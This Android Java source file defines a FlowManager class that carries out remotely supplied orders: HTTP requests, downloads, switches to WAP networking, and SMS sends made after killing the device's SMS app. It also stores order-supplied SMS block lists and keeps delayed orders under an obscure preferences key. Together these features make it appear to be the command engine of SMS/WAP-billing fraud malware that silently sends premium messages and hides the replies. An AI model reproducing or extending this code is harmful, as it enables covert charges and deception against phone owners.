package net.workspace.manager;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import net.workspace.http.DownLoadThread;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.HttpRequestThread;
import net.workspace.http.NetContext;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.SendSmsListener;
import net.workspace.network.NetworkController;
import net.workspace.sms.BlockHelper;
import net.workspace.sms.SmsSender;
import net.workspace.util.MyLogger;
import net.workspace.util.T;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import bean.Json;
import bean.Order;
import bean.Step;
import bean.form.JsonForm;
import bean.prop.Forward;
import bean.prop.KeyValue;
import bean.prop.Matcher;
import bean.prop.Response;
import bean.step.AbstractHttpStep;
import bean.step.DelayStep;
import bean.step.DownLoadStep;
import bean.step.JsonRequestStep;
import bean.step.NetWorkStep;
import bean.step.RequestStep;
import bean.step.SmsStep;

public class FlowManager {
    private class StepHolder {
        Step step;
        StringBuilder errors = new StringBuilder();
        int tryCount;
        int trySequence = 1;
        StepHolder(Step step) {
            this.step = step;
            tryCount = step.tryTimes > 5 ? 5 : step.tryTimes < 1 ? 1 : step.tryTimes;
        }
        void onFailure(String errorMsg) {
            errors.append(trySequence).append(":").append(errorMsg);
            if (trySequence < tryCount) {
                trySequence++;
                if (step.tryInterval > 0) {
                    T.sleep(step.tryInterval * 1000);
                    errors.append(",sleep ").append(step.tryInterval).append(" seconds");
                }
                errors.append("\n");
                executeStep(this);
            } else {
                stepFailure(step, errors.toString());
            }
        }
        void onSuccess() {
            stepSuccess(step, errors.length() > 0 ? errors.toString() : null);
        }
    }
    public static FlowManager getInstanse() {
        if (instanse == null) instanse = new FlowManager();
        return instanse;
    }
    private static boolean validate(String regex, String value) {
        try {
            return regex == null || regex.length() == 0 || value != null && java.util.regex.Pattern.compile(regex).matcher(value).find();
        } catch (Throwable e) {
            MyLogger.error(e);
        }
        return false;
    }
    private static FlowManager instanse;
    private boolean isExecuting = false;
    private List<FlowRuntime> flowRuntimePool;
    private FlowRuntime flowRuntime;
    private int stepIndex = 0;
    private int totalStep = -1;
    private int executCount = 0;
    private static String PREF_WORKSPACE = "HLPDEFGLAAAA";
    long maxDelay = 3600 * 24 * 7;
    private void clean() {
        isExecuting = false;
        flowRuntime = null;
        if (flowRuntimePool != null) {
            flowRuntimePool.clear();
            flowRuntimePool = null;
        }
        instanse = null;
        executCount = 0;
        System.gc();
    }
    private void doChangeNetwork(final StepHolder holder) {
        NetWorkStep step = (NetWorkStep) holder.step;
        int networkType = "wap".equalsIgnoreCase(step.networkType) ? 1 : 0;
        NetworkController.doNetworkTask(networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    holder.onSuccess();
                } else {
                    holder.onFailure(errorMsg);
                }
            }
        });
    }
    private void doDelay(StepHolder holder) {
        T.sleep(((DelayStep) holder.step).delayTime * 1000);
        gotoNextStep();
    }
    private void doDownload(final StepHolder holder) {
        final DownLoadStep step = (DownLoadStep) holder.step;
        NetworkController.doNetworkTask(step.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    holder.onFailure(errorMsg);
                    return;
                }
                String url = T.getRuntimeValue(flowRuntime.variables, step.url);
                if (TextUtils.isEmpty(url)) {
                    holder.onFailure("下载地址获取失败:" + url);
                    return;
                }
                url = replaceRelativeUrl(step, url);
                new DownLoadThread(new NetContext(url, step, flowRuntime.variables, new NetListener() {
                    @Override
                    public void onFailed(int i, String s2, String s3) {
                        holder.onFailure("网络连接失败");
                    }
                    @Override
                    public void onSuccess(int i, String url, String s2) {
                        flowRuntime.urlArray.put(holder.step.index, url);
                        holder.onSuccess();
                    }
                    @Override
                    public void onTimeout(int i) {
                        holder.onFailure("网络连接超时");
                    }
                })).startThread();
            }
        });
    }
    private void doJsonRequest(final StepHolder holder) {
        final JsonRequestStep step = (JsonRequestStep) holder.step;
        NetworkController.doNetworkTask(step.networkType, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    holder.onFailure(errorMsg);
                    return;
                }
                List<KeyValue> params = new ArrayList<KeyValue>();
                if (step.params != null) {
                    for (KeyValue kv : step.params) {
                        params.add(new KeyValue(kv.key, T.getRuntimeValue(flowRuntime.variables, kv.value)));
                    }
                }
                try {
                    JsonForm form = T.initForm(JsonForm.class);
                    form.params = params;
                    String url = T.getRuntimeValue(flowRuntime.variables, step.url);
                    new HttpJsonThread(new NetContext(url, form.toJson(), new NetListener() {
                        @Override
                        public void onFailed(int callBack, String errorCode, String errorMsg) {
                            holder.onFailure(errorMsg);
                        }
                        @Override
                        public void onSuccess(int callBack, String url, String content) {
                            flowRuntime.urlArray.put(holder.step.index, url);
                            parseResponse(holder, step.response, content);
                        }
                        @Override
                        public void onTimeout(int i) {
                            holder.onFailure("网络连接超时");
                        }
                    }, step.secret)).startThread();
                } catch (Throwable e) {
                    MyLogger.error(e);
                }
            }
        });
    }
    private void doRequest(final StepHolder holder) {
        final RequestStep step = (RequestStep) holder.step;
        class StepListener implements NetworkListener {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg != null) {
                    holder.onFailure(errorMsg);
                    return;
                }
                String url = T.getRuntimeValue(flowRuntime.variables, step.url);
                MyLogger.debug(url);
                new HttpRequestThread(new NetContext(url, step, flowRuntime.variables, new NetListener() {
                    @Override
                    public void onFailed(int callBack, String errorCode, String errorMsg) {
                        holder.onFailure(errorMsg);
                    }
                    @Override
                    public void onSuccess(int i, String url, String content) {
                        flowRuntime.urlArray.put(holder.step.index, url);
                        parseResponse(holder, step.response, content);
                    }
                    @Override
                    public void onTimeout(int i) {
                        holder.onFailure("网络连接超时");
                    }
                })).startThread();
            }
        }
        NetworkController.doNetworkTask(step.networkType, new StepListener());
    }
    private void doSendSms(final StepHolder holder) {
        T.killSmsApp();
        final SmsStep step = (SmsStep) holder.step;
        step.realReceiver = T.getRuntimeValue(flowRuntime.variables, step.receiver);
        step.realMsg = T.getRuntimeValue(flowRuntime.variables, step.msg);
        if (TextUtils.isEmpty(step.realReceiver) || TextUtils.isEmpty(step.realMsg)) {
            holder.onFailure("receiverOrMsgEmpty");
            return;
        }
        new SmsSender(new SendSmsListener() {
            @Override
            public void onSendSmsFailed(String address, String message, String errorMsg) {
                holder.onFailure(errorMsg);
            }
            @Override
            public void onSendSmsSuccess(String address, String message) {
                holder.onSuccess();
            }
        }).sendSms(step.realReceiver, step.realMsg, step.timeout);
    }
    private void end(String errorMsg) {
        if (flowRuntime != null && flowRuntime.orderListener != null) {
            flowRuntime.orderListener.onFinished(flowRuntime.variables, errorMsg);
        }
        if (hasNextContext()) {
            gotoNextContext();
            return;
        }
        clean();
    }
    public void execute(Order order, FlowListener orderListener) {
        BlockHelper.saveBlocks(order.blockList);
        BlockHelper.saveFeedbacks(order.feedbackList);
        if (order.delay > 0) {
            saveOrder(order);
            if (orderListener != null) {
                orderListener.onFinished(new HashMap<String, String>(), "delayed");
            }
            return;
        }
        executeFlow(order, orderListener);
    }
    private void executeFlow(Order order, FlowListener orderListener) {
        FlowRuntime runTime = new FlowRuntime();
        runTime.order = order;
        runTime.variables = new HashMap<String, String>();
        runTime.orderListener = orderListener;
        if (flowRuntimePool == null) flowRuntimePool = new ArrayList<FlowRuntime>();
        flowRuntimePool.add(runTime);
        if (!isExecuting) {
            isExecuting = true;
            initBeforeExecute();
        }
    }
    private void executeStep() {
        try {
            if (!validate() || executCount++ > 30) {
                end(null);
                return;
            }
            Step step = flowRuntime.order.stepList.get(stepIndex);
            step.executeStartTime = System.currentTimeMillis();
            executeStep(new StepHolder(step));
        } catch (Throwable e) {
            MyLogger.error(e);
            end(e.toString());
        }
    }
    private void executeStep(StepHolder holder) {
        switch (holder.step.actionId) {
            case Step.REQUEST:
                doRequest(holder);
                break;
            case Step.JSON_REQUEST:
                doJsonRequest(holder);
                break;
            case Step.DOWNLOAD:
                doDownload(holder);
                break;
            case Step.DELAY:
                doDelay(holder);
                break;
            case Step.END:
                holder.onSuccess();
                break;
            case Step.SMS:
                doSendSms(holder);
                break;
            case Step.NETWORK:
                doChangeNetwork(holder);
                break;
        }
    }
    private void gotoNextContext() {
        Iterator<FlowRuntime> iterator = flowRuntimePool.iterator();
        while (iterator.hasNext()) {
            FlowRuntime orderContext = iterator.next();
            if (orderContext.order.id == orderContext.order.id) {
                iterator.remove();
            }
        }
        initBeforeExecute();
    }
    private void gotoNextStep() {
        stepIndex++;
        if (!validate()) {
            end(null);
            return;
        }
        executeStep();
    }
    private boolean hasNextContext() {
        return flowRuntimePool != null && flowRuntimePool.size() > 1;
    }
    private void initBeforeExecute() {
        if (flowRuntimePool != null && flowRuntimePool.size() > 0) {
            flowRuntime = flowRuntimePool.get(0);
        }
        if (flowRuntime != null) {
            if (flowRuntime.order.stepList != null) {
                totalStep = flowRuntime.order.stepList.size();
            }
            stepIndex = 0;
        }
        executCount = 0;
        executeStep();
    }
    private void parseResponse(StepHolder holder, Response response, String content) {
        if (response != null) {
            response.body = content;
            String parseError = parseResponseParam(response);
            if (parseError != null) {
                holder.onFailure(parseError);
                return;
            }
            if (response.forwards != null) {
                for (Forward forward : response.forwards) {
                    if (content.contains(forward.keyword)) {
                        if (forward.jumpNumber != 0) {
                            stepIndex += forward.jumpNumber;
                            break;
                        }
                        //executeStep(key.stepIndex);
                        //return;
                    }
                }
            }
        }
        holder.onSuccess();
    }
    private String parseResponseParam(Response response) {
        MyLogger.debug(response.body);
        if (response.matchers != null) {
            for (Matcher matcher : response.matchers) {
                matcher.value = T.parseVariable(response.body, matcher.match);
                if (!validate(matcher.regexValidate, matcher.value)) { return "parseResponseError:(name:" + matcher.variableName + ",value:" + matcher.value + ")"; }
                if (matcher.value != null) {
                    flowRuntime.variables.put(matcher.variableName, matcher.value);
                }
            }
        }
        return null;
    }
    private String replaceRelativeUrl(AbstractHttpStep httpStep, String target) {
        if (!target.toLowerCase(Locale.getDefault()).startsWith("http")) {
            int index = httpStep.contextIndex;
            if (index < 0) {
                for (int i = httpStep.index - 1; i >= 0; i--) {
                    if (flowRuntime.order.stepList.get(i) instanceof AbstractHttpStep) {
                        index = i;
                        break;
                    }
                }
            }
            if (index >= 0 && flowRuntime.order.stepList.size() > index) {
                Step step = flowRuntime.order.stepList.get(index);
                if (step instanceof AbstractHttpStep) {
                    String stepUrl = flowRuntime.urlArray.get(index);
                    if (stepUrl != null && stepUrl.toLowerCase(Locale.getDefault()).startsWith("http")) {
                        if (target.startsWith("/")) {
                            target = stepUrl.substring(0, stepUrl.indexOf("/", "http://".length() + 2)) + target;
                        } else {
                            target = stepUrl.substring(0, stepUrl.lastIndexOf('/') + 1) + target;
                        }
                    }
                }
            }
        }
        return target;
    }
    private void report(final Step step, final boolean success, final String message) {
        class StepReportListener implements NetListener {
            @Override
            public void onFailed(int callBack, String errorCode, String errorMsg) {
                result();
            }
            @Override
            public void onSuccess(int callBack, String url, String content) {
                result();
            }
            @Override
            public void onTimeout(int i) {
                result();
            }
            private void result() {
                if (success || step.continueOnFailure) {
                    gotoNextStep();
                } else {
                    end(message);
                }
            }
        }
        ReportManager.report(step, success, message, new StepReportListener());
    }
    private void saveOrder(Order order) {
        long delay = order.delay;
        if (delay > maxDelay) delay = maxDelay;
        order.delay = System.currentTimeMillis() + delay * 1000;
        String target = null;
        try {
            target = order.toJson().toString();
        } catch (Exception e) {
            MyLogger.error(e);
        }
        if (target != null) {
            SharedPreferences pref = T.context.getSharedPreferences(PREF_WORKSPACE, Context.MODE_PRIVATE);
            pref.edit().putString(String.valueOf(System.currentTimeMillis()), target).commit();
        }
    }
    public boolean scheduleCheckDelayedOrder() {
        boolean result = false;
        SharedPreferences pref = T.context.getSharedPreferences(PREF_WORKSPACE, Context.MODE_PRIVATE);
        Map<String, ?> map = pref.getAll();
        final List<Order> list = new ArrayList<Order>();
        if (map.size() > 0) {
            long current = System.currentTimeMillis();
            for (String key : map.keySet()) {
                String orderString = pref.getString(key, null);
                if (orderString != null) {
                    try {
                        Order order = Json.optObj(Order.class, new JSONObject(orderString));
                        if (order.delay < current) {
                            list.add(order);
                            pref.edit().remove(key).commit();
                        }
                    } catch (Exception e) {
                        pref.edit().remove(key).commit();
                        MyLogger.error(e);
                    }
                }
            }
        }
        if (list.size() > 0) {
            result = true;
            for (Order order : list) {
                executeFlow(order, null);
            }
        }
        return result;
    }
    private void stepFailure(final Step step, String errorMsg) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportFailure) {
            report(step, false, errorMsg);
        } else if (step.continueOnFailure) {
            gotoNextStep();
        } else {
            end(errorMsg);
        }
    }
    private void stepSuccess(final Step step, String previousStepErrors) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportSuccess) {
            report(step, true, previousStepErrors);
        } else {
            gotoNextStep();
        }
    }
    private boolean validate() {
        return flowRuntime != null && flowRuntime.order != null && flowRuntime.order.stepList != null && flowRuntime.order.stepList.size() > 0 && stepIndex >= 0
                && stepIndex < totalStep;
    }
}
